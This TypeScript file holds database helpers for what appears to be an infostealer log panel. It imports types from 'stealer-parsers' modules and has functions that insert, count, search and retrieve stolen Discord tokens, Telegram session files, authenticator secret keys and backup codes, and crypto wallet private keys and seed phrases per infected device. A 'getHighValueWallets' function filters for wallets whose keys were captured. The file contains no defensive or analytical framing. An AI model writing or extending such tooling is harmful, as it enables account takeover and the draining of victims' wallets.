/**
 * Database Helper Functions for Messaging & Wallet Data
 *
 * Insert and query Discord tokens, Telegram sessions, 2FA data, and crypto wallets
 */

import { executeQuery } from "./db"
import { RowDataPacket } from "mysql2"
import type { DiscordToken } from "./stealer-parsers/discord-parser"
import type { TelegramSession } from "./stealer-parsers/telegram-parser"
import type { AuthenticatorData } from "./stealer-parsers/authenticator-parser"
import type { CryptoWallet } from "./stealer-parsers/wallet-parser"

/**
 * Insert Discord tokens into database
 */
export async function insertDiscordTokens(
  deviceId: string,
  tokens: DiscordToken[],
): Promise<number> {
  if (tokens.length === 0) return 0

  const values = tokens.map((token) => [
    deviceId,
    token.token,
    token.token_type,
    token.user_id || null,
    token.username || null,
    token.email || null,
    token.phone || null,
    token.mfa_enabled || null,
    token.verified || null,
    token.file_path,
    token.source_application || null,
  ])

  const query = `
    INSERT INTO discord_tokens (
      device_id, token, token_type, user_id, username, email, phone,
      mfa_enabled, verified, file_path, source_application
    ) VALUES ?
    ON DUPLICATE KEY UPDATE
      user_id = VALUES(user_id),
      username = VALUES(username),
      email = VALUES(email),
      phone = VALUES(phone),
      mfa_enabled = VALUES(mfa_enabled),
      verified = VALUES(verified)
  `

  await executeQuery(query, [values])
  return tokens.length
}

/**
 * Insert Telegram sessions into database
 */
export async function insertTelegramSessions(
  deviceId: string,
  sessions: TelegramSession[],
): Promise<number> {
  if (sessions.length === 0) return 0

  const values = sessions.map((session) => [
    deviceId,
    session.tdata_path,
    session.has_key_data,
    session.has_user_data,
    session.has_map_files,
    session.session_type,
    session.file_count,
    session.total_size,
    session.original_path,
    null, // phone_number - will be populated later if we parse it
    null, // username - will be populated later if we parse it
    null, // user_id - will be populated later if we parse it
  ])

  const query = `
    INSERT INTO telegram_sessions (
      device_id, tdata_path, has_key_data, has_user_data, has_map_files,
      session_type, file_count, total_size, original_path,
      phone_number, username, user_id
    ) VALUES ?
  `

  await executeQuery(query, [values])
  return sessions.length
}

/**
 * Insert 2FA/Authenticator data into database
 */
export async function insertAuthenticatorData(
  deviceId: string,
  authData: AuthenticatorData[],
): Promise<number> {
  if (authData.length === 0) return 0

  const values = authData.map((auth) => [
    deviceId,
    auth.app_type,
    auth.service_name || null,
    auth.account_name || null,
    auth.secret_key || null,
    auth.backup_codes ? JSON.stringify(auth.backup_codes) : null,
    auth.qr_code_path || null,
    auth.file_path,
  ])

  const query = `
    INSERT INTO authenticator_data (
      device_id, app_type, service_name, account_name, secret_key,
      backup_codes, qr_code_path, file_path
    ) VALUES ?
  `

  await executeQuery(query, [values])
  return authData.length
}

/**
 * Insert crypto wallets into database
 */
export async function insertCryptoWallets(
  deviceId: string,
  wallets: CryptoWallet[],
): Promise<number> {
  if (wallets.length === 0) return 0

  const values = wallets.map((wallet) => [
    deviceId,
    wallet.wallet_type,
    wallet.wallet_name,
    wallet.address || null,
    wallet.private_key || null,
    wallet.seed_phrase || null,
    wallet.mnemonic || null,
    wallet.keystore_file || null,
    wallet.password_hint || null,
    wallet.file_path,
    wallet.blockchain || null,
  ])

  const query = `
    INSERT INTO crypto_wallets (
      device_id, wallet_type, wallet_name, address, private_key,
      seed_phrase, mnemonic, keystore_file, password_hint,
      file_path, blockchain
    ) VALUES ?
  `

  await executeQuery(query, [values])
  return wallets.length
}

/**
 * Get Discord tokens by device ID
 */
export async function getDiscordTokensByDevice(deviceId: string): Promise<DiscordToken[]> {
  const query = `
    SELECT * FROM discord_tokens
    WHERE device_id = ?
    ORDER BY created_at DESC
  `

  const rows = (await executeQuery(query, [deviceId])) as RowDataPacket[]
  return rows.map((row) => ({
    token: row.token,
    token_type: row.token_type,
    user_id: row.user_id,
    username: row.username,
    email: row.email,
    phone: row.phone,
    mfa_enabled: row.mfa_enabled,
    verified: row.verified,
    file_path: row.file_path,
    source_application: row.source_application,
  }))
}

/**
 * Get Telegram sessions by device ID
 */
export async function getTelegramSessionsByDevice(deviceId: string): Promise<TelegramSession[]> {
  const query = `
    SELECT * FROM telegram_sessions
    WHERE device_id = ?
    ORDER BY created_at DESC
  `

  const rows = (await executeQuery(query, [deviceId])) as RowDataPacket[]
  return rows.map((row) => ({
    tdata_path: row.tdata_path,
    has_key_data: row.has_key_data,
    has_user_data: row.has_user_data,
    has_map_files: row.has_map_files,
    session_type: row.session_type,
    session_files: [], // Not stored in DB
    file_count: row.file_count,
    total_size: row.total_size,
    original_path: row.original_path,
  }))
}

/**
 * Get crypto wallets by device ID
 */
export async function getCryptoWalletsByDevice(deviceId: string): Promise<CryptoWallet[]> {
  const query = `
    SELECT * FROM crypto_wallets
    WHERE device_id = ?
    ORDER BY created_at DESC
  `

  const rows = (await executeQuery(query, [deviceId])) as RowDataPacket[]
  return rows.map((row) => ({
    wallet_type: row.wallet_type,
    wallet_name: row.wallet_name,
    address: row.address,
    private_key: row.private_key,
    seed_phrase: row.seed_phrase,
    mnemonic: row.mnemonic,
    keystore_file: row.keystore_file,
    password_hint: row.password_hint,
    file_path: row.file_path,
    blockchain: row.blockchain,
  }))
}

/**
 * Get authenticator data by device ID
 */
export async function getAuthenticatorDataByDevice(
  deviceId: string,
): Promise<AuthenticatorData[]> {
  const query = `
    SELECT * FROM authenticator_data
    WHERE device_id = ?
    ORDER BY created_at DESC
  `

  const rows = (await executeQuery(query, [deviceId])) as RowDataPacket[]
  return rows.map((row) => ({
    app_type: row.app_type,
    service_name: row.service_name,
    account_name: row.account_name,
    secret_key: row.secret_key,
    backup_codes: row.backup_codes ? JSON.parse(row.backup_codes) : undefined,
    qr_code_path: row.qr_code_path,
    file_path: row.file_path,
  }))
}

/**
 * Get counts for all messaging/wallet data
 */
export async function getMessagingWalletCounts(deviceId: string): Promise<{
  discord_tokens: number
  telegram_sessions: number
  authenticator_data: number
  crypto_wallets: number
}> {
  const queries = [
    `SELECT COUNT(*) as count FROM discord_tokens WHERE device_id = ?`,
    `SELECT COUNT(*) as count FROM telegram_sessions WHERE device_id = ?`,
    `SELECT COUNT(*) as count FROM authenticator_data WHERE device_id = ?`,
    `SELECT COUNT(*) as count FROM crypto_wallets WHERE device_id = ?`,
  ]

  const [discordRows, telegramRows, authRows, walletRows] = await Promise.all(
    queries.map((q) => executeQuery(q, [deviceId]) as Promise<RowDataPacket[]>),
  )

  return {
    discord_tokens: discordRows[0]?.count || 0,
    telegram_sessions: telegramRows[0]?.count || 0,
    authenticator_data: authRows[0]?.count || 0,
    crypto_wallets: walletRows[0]?.count || 0,
  }
}

/**
 * Search crypto wallets with filters
 */
export async function searchCryptoWallets(filters: {
  deviceId?: string
  walletType?: string
  walletName?: string
  blockchain?: string
  hasSeedPhrase?: boolean
  hasPrivateKey?: boolean
}): Promise<CryptoWallet[]> {
  let query = `SELECT * FROM crypto_wallets WHERE 1=1`
  const params: any[] = []

  if (filters.deviceId) {
    query += ` AND device_id = ?`
    params.push(filters.deviceId)
  }

  if (filters.walletType) {
    query += ` AND wallet_type = ?`
    params.push(filters.walletType)
  }

  if (filters.walletName) {
    query += ` AND wallet_name LIKE ?`
    params.push(`%${filters.walletName}%`)
  }

  if (filters.blockchain) {
    query += ` AND blockchain = ?`
    params.push(filters.blockchain)
  }

  if (filters.hasSeedPhrase !== undefined) {
    query += ` AND seed_phrase IS ${filters.hasSeedPhrase ? "NOT" : ""} NULL`
  }

  if (filters.hasPrivateKey !== undefined) {
    query += ` AND private_key IS ${filters.hasPrivateKey ? "NOT" : ""} NULL`
  }

  query += ` ORDER BY created_at DESC`

  const rows = (await executeQuery(query, params)) as RowDataPacket[]
  return rows.map((row) => ({
    wallet_type: row.wallet_type,
    wallet_name: row.wallet_name,
    address: row.address,
    private_key: row.private_key,
    seed_phrase: row.seed_phrase,
    mnemonic: row.mnemonic,
    keystore_file: row.keystore_file,
    password_hint: row.password_hint,
    file_path: row.file_path,
    blockchain: row.blockchain,
  }))
}

/**
 * Get high-value wallets (with seed phrases or private keys)
 */
export async function getHighValueWallets(deviceId?: string): Promise<CryptoWallet[]> {
  let query = `
    SELECT * FROM crypto_wallets
    WHERE (seed_phrase IS NOT NULL OR private_key IS NOT NULL)
  `

  const params: any[] = []

  if (deviceId) {
    query += ` AND device_id = ?`
    params.push(deviceId)
  }

  query += ` ORDER BY created_at DESC`

  const rows = (await executeQuery(query, params)) as RowDataPacket[]
  return rows.map((row) => ({
    wallet_type: row.wallet_type,
    wallet_name: row.wallet_name,
    address: row.address,
    private_key: row.private_key,
    seed_phrase: row.seed_phrase,
    mnemonic: row.mnemonic,
    keystore_file: row.keystore_file,
    password_hint: row.password_hint,
    file_path: row.file_path,
    blockchain: row.blockchain,
  }))
}
